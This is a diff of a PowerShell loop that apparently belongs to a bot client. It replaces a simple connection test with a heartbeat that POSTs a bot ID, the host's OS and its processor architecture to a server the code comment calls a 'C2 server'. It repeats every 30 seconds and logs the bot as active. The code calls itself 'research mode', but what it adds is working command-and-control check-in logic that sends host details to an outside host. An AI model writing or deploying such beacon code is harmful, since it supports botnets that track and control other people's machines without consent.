@@ -18,14 +18,29 @@ while ($true) {
     $timestamp = Get-Date -Format "HH:mm:ss"
     
     try {
-        # Test connection to server
-        $response = Invoke-RestMethod -Uri $ServerUrl -Method GET -TimeoutSec 10
+        # Send heartbeat to C2 server
+        $headers = @{
+            "X-Bot-ID" = $BotId
+            "X-Platform" = "$($env:OS) $($env:PROCESSOR_ARCHITECTURE)"
+            "X-Research-Mode" = "true"
+            "Content-Type" = "application/json"
+        }
+        
+        $body = @{
+            bot_id = $BotId
+            platform = "$($env:OS) $($env:PROCESSOR_ARCHITECTURE)"
+            timestamp = (Get-Date).ToString("o")
+            research_mode = $true
+        } | ConvertTo-Json
+        
+        $response = Invoke-RestMethod -Uri "$ServerUrl/api/heartbeat" -Method POST -Headers $headers -Body $body -TimeoutSec 10
         
         $connectionCount++
         Write-Host "[$timestamp] [CONNECTED] Bot active - Research mode (Connection #$connectionCount)" -ForegroundColor Green
+        Write-Host "[$timestamp] Server Response: $($response.message)" -ForegroundColor Blue
         
         $uptime = (Get-Date) - $startTime
-        Write-Host "[$timestamp] Uptime: $($uptime.ToString('hh\:mm\:ss')) | Heartbeat sent" -ForegroundColor Cyan
+        Write-Host "[$timestamp] Uptime: $($uptime.ToString('hh\:mm\:ss')) | Heartbeat sent to /api/heartbeat" -ForegroundColor Cyan
         
         Start-Sleep -Seconds 30
     }
